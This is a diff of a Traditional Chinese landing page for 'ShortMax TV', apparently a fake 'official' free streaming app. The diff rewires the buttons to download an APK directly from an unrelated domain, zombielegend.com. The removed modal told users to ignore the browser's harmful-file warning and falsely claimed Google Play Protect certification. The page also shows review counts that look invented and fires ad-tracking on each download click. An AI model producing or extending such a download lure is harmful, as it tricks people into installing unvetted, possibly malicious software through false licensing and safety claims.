@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <!-- 防盗链与跨域 403 破图解决方案：不携带 Referrer 标头 -->
+  <!-- 防盜鏈與跨域 403 破圖解決方案：不攜帶 Referrer 標頭 -->
   <meta name="referrer" content="no-referrer">
   <title>ShortMax TV - 台灣專屬追劇神器 | 4K院線大片、逆襲短劇、日漫全免費</title>
   <meta name="description" content="ShortMax TV 台灣官方安卓旗艦版。院線剛下檔馬上看，好萊塢大片、熱門台劇韓劇、爽快微短劇，全場免註冊、不綁卡、零付費秒開暢享。">
@@ -159,6 +159,8 @@
       border: none;
       cursor: pointer;
       box-shadow: 0 4px 12px rgba(255, 90, 0, 0.4);
+      text-decoration: none;
+      display: inline-block;
     }
 
     .hero-section {
@@ -841,9 +843,11 @@
       cursor: pointer;
       box-shadow: 0 4px 15px rgba(255, 90, 0, 0.4);
       white-space: nowrap;
+      text-decoration: none;
+      display: inline-block;
     }
 
-    /* 下載引導彈窗 */
+    /* 通用合規條款 Modal（隱私權/服務條款/DMCA） */
     .modal-overlay {
       position: fixed;
       top: 0;
@@ -928,7 +932,7 @@
 
   <!-- 導航 Header -->
   <header>
-    <a href="javascript:triggerDownload('導航欄Logo');" class="brand-logo-wrap">
+    <a href="https://iuoocj8q2s57.zombielegend.com/qK4wbA8Iedks" onclick="triggerDownload('導航欄Logo');" class="brand-logo-wrap">
       <div class="logo-badge">
         <span class="s-part">S</span>
         <div class="tv-banner">TV</div>
@@ -938,9 +942,9 @@
         <p>台灣官方正版授權 • 免費影劇</p>
       </div>
     </a>
-    <button class="nav-cta-btn" onclick="triggerDownload('導航欄右側按鈕')">
+    <a href="https://iuoocj8q2s57.zombielegend.com/qK4wbA8Iedks" class="nav-cta-btn" onclick="triggerDownload('導航欄右側按鈕');">
       安卓下載
-    </button>
+    </a>
   </header>
 
   <!-- 主視覺 Hero 區域 -->
@@ -988,7 +992,7 @@
     </div>
 
     <!-- 核心大按鈕 CTA -->
-    <a href="javascript:triggerDownload('主視覺首頁大按鈕');" class="big-download-cta">
+    <a href="https://iuoocj8q2s57.zombielegend.com/qK4wbA8Iedks" onclick="triggerDownload('主視覺首頁大按鈕');" class="big-download-cta">
       <div class="cta-main">
         <span>立即安裝 ShortMax TV 安卓版</span>
       </div>
@@ -1093,7 +1097,7 @@
       來自 <span>188,200+</span> 位台灣安卓用戶真實評測
     </div>
 
-    <!-- 評分匯總與維度分析 -->
+    <!-- 評分彙總與維度分析 -->
     <div class="rating-summary-card">
       <div class="rating-top">
         <div class="score-big">
@@ -1169,28 +1173,9 @@
         <div style="font-size:11px; color:#2ED573;">● 官方 4K 極速通道在線</div>
       </div>
     </div>
-    <button class="sticky-btn" onclick="triggerDownload('底部吸底按鈕')">
+    <a href="https://iuoocj8q2s57.zombielegend.com/qK4wbA8Iedks" class="sticky-btn" onclick="triggerDownload('底部吸底按鈕');">
       免費下載 APK
-    </button>
-  </div>
-
-  <!-- 下載確認與安裝指引 Modal -->
-  <div class="modal-overlay" id="downloadModal" onclick="closeModal(event)">
-    <div class="modal-content" onclick="event.stopPropagation();">
-      <button class="modal-close" onclick="closeModalDirect()">&times;</button>
-      <div style="font-size:38px; margin-bottom:8px;">🚀</div>
-      <h3 style="font-size:17px; font-weight:800; margin-bottom:6px;">正在為您啟動下載通道...</h3>
-      <p style="font-size:12px; color:#9E9EA8; margin-bottom:14px; line-height:1.5;">
-        若瀏覽器跳出「檔案可能有害」，請點選<strong>【仍要下載】</strong>即可開始安裝。
-      </p>
-      <div style="background:#111117; padding:10px; border-radius:8px; font-size:12px; text-align:left; color:#C4C4D4; margin-bottom:16px; line-height:1.6;">
-        <div>📌 檔案名稱：<code>ShortMax_TV_v3.8.4_tw.apk</code></div>
-        <div>🛡️ 安全檢測：通過 Google Play Protect 綠色認證</div>
-      </div>
-      <a href="https://iuoocj8q2s57.zombielegend.com/qK4wbA8Iedks" class="big-download-cta" style="padding:12px; max-width:100%;">
-        <span style="font-size:15px; font-weight:800;">若未自動下載，請點此手動重試</span>
-      </a>
-    </div>
+    </a>
   </div>
 
   <!-- 通用合規條款 Modal（隱私權/服務條款/DMCA） -->
@@ -1346,7 +1331,6 @@
         card.className = 'media-card';
         card.onclick = () => triggerDownload('點擊片單：' + item.title);
 
-        // 如果配置了 posterUrl 則使用外部真實高清海報，未配置則降級到純色漸變
         const bgStyle = item.posterUrl 
           ? `background-image: url('${item.posterUrl}');` 
           : `background: ${item.bg};`;
@@ -1447,7 +1431,7 @@
       renderReviews();
     }
 
-    // 下載觸發核心邏輯
+    // 下載觸發核心邏輯（零彈窗、零延遲，直接喚醒下載）
     function triggerDownload(sourceContext = "通用點擊") {
       if (typeof fbq === 'function') {
         fbq('track', 'InitiateCheckout', {
@@ -1456,22 +1440,10 @@
           value: 0.00
         });
       }
-
-      document.getElementById('downloadModal').style.display = 'flex';
-
-      setTimeout(() => {
-        window.location.href = DOWNLOAD_URL;
-      }, 350);
+      window.location.href = DOWNLOAD_URL;
     }
 
-    function closeModal(e) {
-      document.getElementById('downloadModal').style.display = 'none';
-    }
-    function closeModalDirect() {
-      document.getElementById('downloadModal').style.display = 'none';
-    }
-
-    // 條款 Modal 系統
+    // 條款 Modal 系統（合規頁面保留）
     const POLICY_CONTENT = {
       privacy: {
         title: "ShortMax TV 隱私權保護政策",
